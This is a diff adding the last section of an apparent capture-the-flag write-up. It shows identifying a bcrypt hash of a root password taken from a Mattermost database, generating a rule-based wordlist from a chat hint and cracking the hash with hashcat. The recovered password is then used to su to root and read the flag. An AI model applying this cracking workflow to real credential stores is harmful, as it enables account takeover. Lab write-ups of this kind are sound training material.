@@ -817,6 +817,186 @@ MariaDB [mattermost]> SELECT Username,Password,Email from Users;
 Very interesting, the Username `root` has a Password hash of `$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO`.
 
 ## 9. Password Cracking & Root Flag
-We need to identify this hash type.
+We need to identify this hash type. Let's try Crackstation first. No harm, eh?
 ```
+$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO	Unknown	Unrecognized hash format.
+```
+Trying something new, we use `hashid`.
+```
+hippoeug@kali:~$ hashid
+$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
+Analyzing '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+```
+So this hash is generated with the `bcrypt` algorithm.. hmm.
+
+Earlier on in the MatterMost chat, we saw a interesting message that the message is a variant of `PleaseSubscribe!`.
+
+![MatterMost](https://user-images.githubusercontent.com/21957042/113501458-c2edf480-9557-11eb-8eaa-3c504a352160.png)
+
+Let's create a wordlist based on that!
+```
+hippoeug@kali:~$ cat > rule
+PleaseSubscribe! (Ctrl+D to Terminate)
+
+hippoeug@kali:~$ hashcat -r /usr/share/hashcat/rules/best64.rule --stdout rule > wordlist.txt
+
+hippoeug@kali:~$ cat wordlist.txt
+PleaseSubscribe!
+!ebircsbuSesaelP
+PLEASESUBSCRIBE!
+pleaseSubscribe!
+PleaseSubscribe!0
+PleaseSubscribe!1
+PleaseSubscribe!2
+PleaseSubscribe!3
+PleaseSubscribe!4
+PleaseSubscribe!5
+PleaseSubscribe!6
+PleaseSubscribe!7
+PleaseSubscribe!8
+PleaseSubscribe!9
+PleaseSubscribe!00
+PleaseSubscribe!01
+PleaseSubscribe!02
+PleaseSubscribe!11
+PleaseSubscribe!12
+PleaseSubscribe!13
+PleaseSubscribe!21
+PleaseSubscribe!22
+PleaseSubscribe!23
+PleaseSubscribe!69
+PleaseSubscribe!77
+PleaseSubscribe!88
+PleaseSubscribe!99
+PleaseSubscribe!123
+PleaseSubscribe!e
+PleaseSubscribe!s
+PleaseSubscribea
+PleaseSubscribs
+PleaseSubscriba
+PleaseSubscriber
+PleaseSubscribie
+PleaseSubscrio
+PleaseSubscriy
+PleaseSubscri123
+PleaseSubscriman
+PleaseSubscridog
+1PleaseSubscribe!
+thePleaseSubscribe!
+dleaseSubscribe!
+maeaseSubscribe!
+PleaseSubscribe!
+PleaseSubscr1be!
+Pl3as3Subscrib3!
+PlaseSubscribe!
+PlseSubscribe!
+PleseSubscribe!
+PleaeSubscribe!
+Ples
+Pleas1
+PleaseSubscribe
+PleaseSubscrib
+PleaseSubscri
+PleaseSubscriPleaseSubscri
+PeaseSubscri
+ribe
+bscribe!easeSu
+PleaseSubscri!
+dleaseSubscrib
+be!PleaseSubscri
+ibe!
+ribe!
+cribcrib
+tlea
+asPasP
+XleaseSubscribe!
+SaseSubscribe!
+PleaSu
+PlesPles
+asP
+PlcrPlcr
+PcSu
+PleasS
+PeSubs
+```
+This list is shorter than I thought. Moving on, let's define the Hash.
+```
+hippoeug@kali:~$ cat > hash
+$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO (Ctrl+D to Terminate)
+```
+And, time to run `HashCat`. Meow.
+
+We need to specify a few parameters for Hashcat. The mode number for `bcrypt` algorithm is `-m 3200`, and `-a 0` states to use all the words in the list to attack.
+```
+hippoeug@kali:~$ hashcat -m 3200 -a 0 hash wordlist.txt -o cracked.txt
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-4300U CPU @ 1.90GHz, 2862/2926 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 65 MB
+
+Dictionary cache built:
+* Filename..: wordlist.txt
+* Passwords.: 77
+* Bytes.....: 1177
+* Keyspace..: 77
+* Runtime...: 0 secs
+
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: bcrypt $2*$, Blowfish (Unix)
+Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
+Time.Started.....: Sun Apr  4 15:03:20 2021 (1 sec)
+Time.Estimated...: Sun Apr  4 15:03:21 2021 (0 secs)
+Guess.Base.......: File (wordlist.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       19 H/s (11.78ms) @ Accel:4 Loops:32 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 32/77 (41.56%)
+Rejected.........: 0/32 (0.00%)
+Restore.Point....: 16/77 (20.78%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
+Candidates.#1....: PleaseSubscribe!02 -> PleaseSubscribs
+
+Started: Sun Apr  4 15:02:25 2021
+Stopped: Sun Apr  4 15:03:23 2021
+hippoeug@kali:~$ cat cracked.txt
+$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
+```
+And the password for user `root` is `PleaseSubscribe!21`!
+
+We should be able to login to get the root flag now.
+```
+maildeliverer@Delivery:~$ su root
+Password: 
+
+root@Delivery:~# pwd
+/root
+
+root@Delivery:~# ls
+mail.sh  note.txt  py-smtp.py  root.txt
+
+root@Delivery:~# cat root.txt
+50058d4d1b3e167f195f87664d8ffa27
 ```
